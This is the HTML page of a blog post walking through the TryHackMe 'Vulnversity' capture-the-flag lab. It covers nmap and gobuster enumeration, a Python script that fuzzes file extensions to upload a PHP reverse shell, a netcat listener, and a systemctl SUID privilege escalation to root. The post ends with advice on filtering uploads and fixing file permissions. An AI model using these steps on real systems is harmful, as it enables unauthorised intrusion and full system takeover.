@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>TryHackMe - Vulnversity Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="TryHackMe - Vulnversity Writeup" />
+<meta property="og:description" content="Link : https://tryhackme.com/room/vulnversity
+Enumeration First we need to do reconnaissance by using nmap (Network Mapper) to find open ports and to understand the machine. I&rsquo;m gonna run this command:
+1 nmap -sC -sV -O -oN nmap/initial &lt;machine ip&gt; Explaining the nmap scan: -sC	:= scan using nmap default script -sV	:= scan for version -O := scan for OS (operating system) -oN := output in normal format Now our nmap scan is done." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/thm/vulnversity/" /><meta property="og:image" content="http://localhost:1313/posts/thm/vulnversity/featured.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-10T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-10T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/posts/thm/vulnversity/featured.png" /><meta name="twitter:title" content="TryHackMe - Vulnversity Writeup"/>
+<meta name="twitter:description" content="Link : https://tryhackme.com/room/vulnversity
+Enumeration First we need to do reconnaissance by using nmap (Network Mapper) to find open ports and to understand the machine. I&rsquo;m gonna run this command:
+1 nmap -sC -sV -O -oN nmap/initial &lt;machine ip&gt; Explaining the nmap scan: -sC	:= scan using nmap default script -sV	:= scan for version -O := scan for OS (operating system) -oN := output in normal format Now our nmap scan is done."/>
+<meta name="twitter:site" content="@_shafiqaiman_"/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/thm/vulnversity/" /><link rel="next" href="http://localhost:1313/posts/thm/pickle_rick/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe - Vulnversity Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/thm\/vulnversity\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/posts\/thm\/vulnversity\/featured.png",
+                            "width":  705 ,
+                            "height":  118 
+                        }],"genre": "posts","keywords": "upload-vuln, GTFOBins","wordcount":  1112 ,
+        "url": "http:\/\/localhost:1313\/posts\/thm\/vulnversity\/","datePublished": "2021-07-10T00:00:00+00:00","dateModified": "2021-07-10T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TryHackMe - Vulnversity Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/tryhackme/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>TryHackMe</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="10-07-2021">10-07-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1112 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/featured.png"
+        data-srcset="/posts/thm/vulnversity/featured.png, /posts/thm/vulnversity/featured.png 1.5x, /posts/thm/vulnversity/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/featured.png"
+        title="/posts/thm/vulnversity/featured.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#explaining-the-nmap-scan">Explaining the nmap scan:</a></li>
+        <li><a href="#explaining-gobuster-flag">Explaining gobuster flag:</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://tryhackme.com/room/vulnversity" target="_blank" rel="noopener noreffer ">Link : https://tryhackme.com/room/vulnversity</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>First we need to do reconnaissance by using nmap (Network Mapper) to find open ports and to understand the machine. I&rsquo;m gonna run this command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -sC -sV -O -oN nmap/initial &lt;machine ip&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="explaining-the-nmap-scan">Explaining the nmap scan:</h3>
+<ul>
+<li>-sC	:= scan using nmap default script</li>
+<li>-sV	:= scan for version</li>
+<li>-O 	:= scan for OS (operating system)</li>
+<li>-oN := output in normal format</li>
+</ul>
+<p>Now our nmap scan is done. So, let&rsquo;s do bad thing <em>evil grin</em> lol. Just joking okayy.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/2.png"
+        data-srcset="/posts/thm/vulnversity/2.png, /posts/thm/vulnversity/2.png 1.5x, /posts/thm/vulnversity/2.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/2.png"
+        title="2" width="1268" height="638" /></p>
+<p>We can see this machine have 6 ports open. The result always screaming that lot of services running on ubuntu. We can see that this machine also have squid proxy and the version too. So, first maybe we can try ftp login as anonymous but unfortunately we cannot login ftp as anonymous.</p>
+<p>This machine have http on port 3333 and running on apache web server. Let&rsquo;s take a look!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/3.png"
+        data-srcset="/posts/thm/vulnversity/3.png, /posts/thm/vulnversity/3.png 1.5x, /posts/thm/vulnversity/3.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/3.png"
+        title="3" width="1263" height="820" /></p>
+<p>OH! what a lovely website. We know that they have a website and we can enumerate futher by using gobuster tool. Gobuster is a tool for searching hidden directory in the web. If you doesn&rsquo;t have gobuster. You&hellip;. yeah&hellip;youuu can visit this <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreffer ">github repos</a>.</p>
+<p>Let&rsquo;s run gobuster using this command</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gobuster dir -u http://10.10.111.81:3333/ -w /opt/directory-medium.txt --no-error
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="explaining-gobuster-flag">Explaining gobuster flag:</h3>
+<ul>
+<li>dir	  := using directory mode</li>
+<li>-u		:= specify url</li>
+<li>-w		:= specify wordlist</li>
+<li>&ndash;no-error := no error</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/4.png"
+        data-srcset="/posts/thm/vulnversity/4.png, /posts/thm/vulnversity/4.png 1.5x, /posts/thm/vulnversity/4.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/4.png"
+        title="4" width="889" height="365" /></p>
+<p>So, here&rsquo;s the result. If you look super close but not at the monitor though jk. Gobuster found a hidden directory called /internal. Let&rsquo;s go to that hidden directory.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/5.png"
+        data-srcset="/posts/thm/vulnversity/5.png, /posts/thm/vulnversity/5.png 1.5x, /posts/thm/vulnversity/5.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/5.png"
+        title="5" width="829" height="301" /></p>
+<p>Apparently, that&rsquo;s directory leads us to this page a.k.a upload page. We can upload php reverse shell on that.</p>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<p>But how to get php reverse shell and how to setup, even how to use it. (it&rsquo;s okay I got you ladies &amp; gentlemen)</p>
+<ol>
+<li>Go to this <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer ">site here</a></li>
+<li>Download it or you can copy it. If you copy it, make sure to save it in the file with php extensions. example := revshell.php</li>
+<li>Open the file and change the ip address to yours tryhackme ip address, If you want to change the port. Just change it. The port in this case is going to be a listing port.</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/6.png"
+        data-srcset="/posts/thm/vulnversity/6.png, /posts/thm/vulnversity/6.png 1.5x, /posts/thm/vulnversity/6.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/6.png"
+        title="6" width="364" height="193" /><br>
+<em>original</em></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/7.png"
+        data-srcset="/posts/thm/vulnversity/7.png, /posts/thm/vulnversity/7.png 1.5x, /posts/thm/vulnversity/7.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/7.png"
+        title="7" width="385" height="186" /><br>
+<em>alter with ip and port</em></p>
+<p>However, when we upload a php file to the page it&rsquo;s gonna response ‘extension not allowed’. Looking back at the questions ‘TASK 4’. Now we know that we can fuzz this upload page with different file extensions.</p>
+<p>So, I gonna make python script for that. You can use burpsuite if you want to. Why I&rsquo;m using python script??? because I want to learn duhhh and I&rsquo;m not saying that I really good in python NO. TBH I wacthed a lot of tutorial for just simple task and I keep adding time in this box. man oh man. It&rsquo;s worth it tho. So here is my script</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.111.81:3333/internal/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">action</span> <span class="o">=</span> <span class="s2">&#34;/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;file&#39;</span><span class="p">:</span><span class="s1">&#39;/index.php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;submit&#39;</span><span class="p">:</span><span class="s1">&#39;Submit&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">oldfile</span> <span class="o">=</span> <span class="s2">&#34;revshell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="s2">&#34;revshell&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.php3&#39;</span><span class="p">,</span><span class="s1">&#39;.php4&#39;</span><span class="p">,</span><span class="s1">&#39;.php5&#39;</span><span class="p">,</span><span class="s1">&#39;.phtml&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">ext</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">newfile</span> <span class="o">=</span> <span class="n">file</span> <span class="o">+</span> <span class="n">ext</span>
+</span></span><span class="line"><span class="cl">	<span class="n">rename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">rename</span><span class="p">(</span><span class="n">oldfile</span><span class="p">,</span> <span class="n">newfile</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">file_to_upload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">newfile</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">action</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">file_to_upload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="s2">&#34;Extension not allowed&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;This file not allowed : </span><span class="si">{</span><span class="n">newfile</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;This file is allowed : </span><span class="si">{</span><span class="n">newfile</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">oldfile</span> <span class="o">=</span> <span class="n">newfile</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s run the script and finally yes. We got a hit boys. This page only accept .phtml extensions. COOL</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/8.png"
+        data-srcset="/posts/thm/vulnversity/8.png, /posts/thm/vulnversity/8.png 1.5x, /posts/thm/vulnversity/8.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/8.png"
+        title="8" width="389" height="126" /></p>
+<p>Now we need to setup netcat listener to the port that we change in the our reverse shell. If you can see I&rsquo;m listen to the port 6969, because I&rsquo;m using this port in my reverse shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lnvp 6969
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To activated our reverse shell go to this url http://10.10.111.81:3333/internal/uploads/ . But how you found the <code>/uploads</code> directory. Good questions. Just run gobuster against /internal directory. We found this.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/9.png"
+        data-srcset="/posts/thm/vulnversity/9.png, /posts/thm/vulnversity/9.png 1.5x, /posts/thm/vulnversity/9.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/9.png"
+        title="9" width="405" height="242" /></p>
+<p>To activated our shell just double click at our reverse shell file. Mine here name revshell.phtml but yours maybe different. I don&rsquo;t know because this is mine not yourssss!!!! joking of course. Please don&rsquo;t be offended. HAHAHAHAH jk.</p>
+<p>Now we&rsquo;re in!!!!Now let&rsquo;s hunt the user flag. So, let&rsquo;s navigate ourselves to the home directory to list a user directory. WOW!!! now we know that bill the one who manage this webserver.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/10.png"
+        data-srcset="/posts/thm/vulnversity/10.png, /posts/thm/vulnversity/10.png 1.5x, /posts/thm/vulnversity/10.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/10.png"
+        title="10" width="217" height="85" /></p>
+<p>Let&rsquo;s go into bill&rsquo;s home directory to find user flag. Yes we got a user flag. To read this flag you need to use the <code>cat command</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/11.png"
+        data-srcset="/posts/thm/vulnversity/11.png, /posts/thm/vulnversity/11.png 1.5x, /posts/thm/vulnversity/11.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/11.png"
+        title="11" width="227" height="66" /></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>How to be root. Now we can do a basic enumeration if you want. Anyways, the questions ask what the most stand out file in SUID file. To find this file called SUID we need run this command</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -user root -perm -4000 -exec ls -ldb <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, this command means find all SUID file that owns by root user. After find it, make it the file in the list using ls. If we got an errors please don&rsquo;t display the errors to us.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/12.png"
+        data-srcset="/posts/thm/vulnversity/12.png, /posts/thm/vulnversity/12.png 1.5x, /posts/thm/vulnversity/12.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/12.png"
+        title="12" width="922" height="547" /></p>
+<p>We got all of this but how to find the one that most stand out. You can make your linux machine as the base line. Try run the same command in your box and try compare it.</p>
+<p>In this case the file called <code>/bin/systemctl</code> the most stands out. So, we&rsquo;re gonna use systemctl to be root but how. Easy, just go to this site called <a href="https://gtfobins.github.io/#" target="_blank" rel="noopener noreffer ">GTFObins</a> . Try search systemctl suid in it.</p>
+<p>So, I don&rsquo;t know where is the flag are. What I&rsquo;m gonna do, is to make file <code>/bin/bash</code> as <code>SUID</code>. Hmm, sound fun! With it we can be root or to be specific euid root</p>
+<p>To use this command just take all and copy it in the box</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">Type=oneshot
+</span></span></span><span class="line"><span class="cl"><span class="s1">ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">[Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After you&rsquo;ve done copy and paste that command.
+Run <code>/bin/bash -p</code> and now become root.</p>
+<p>Just navigate through root directory and you found the flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/thm/vulnversity/13.png"
+        data-srcset="/posts/thm/vulnversity/13.png, /posts/thm/vulnversity/13.png 1.5x, /posts/thm/vulnversity/13.png 2x"
+        data-sizes="auto"
+        alt="/posts/thm/vulnversity/13.png"
+        title="13" width="880" height="131" /></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I’ve learned a lot today. If you have an upload page on your website make sure you use the filter options. Filter out the bad file to make your site a bit safer. Also, you must configure your file permission very-very-very-very-very good. If you see, I become root with simple misconfigure file permission and that&rsquo;s it.</p>
+<p>This room so much fun and I hope you guys have fun and learn something new today.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 10-07-2021</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/thm/vulnversity/" data-title="TryHackMe - Vulnversity Writeup" data-via="_shafiqaiman_" data-hashtags="upload-vuln,GTFOBins"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/thm/vulnversity/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/thm/vulnversity/" data-title="TryHackMe - Vulnversity Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://localhost:1313/posts/thm/vulnversity/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/upload-vuln/">Upload-Vuln</a>,&nbsp;<a href="/tags/gtfobins/">GTFOBins</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/posts/thm/pickle_rick/" class="next" rel="next" title="TryHackMe - Pickle Rick Writeup">TryHackMe - Pickle Rick Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
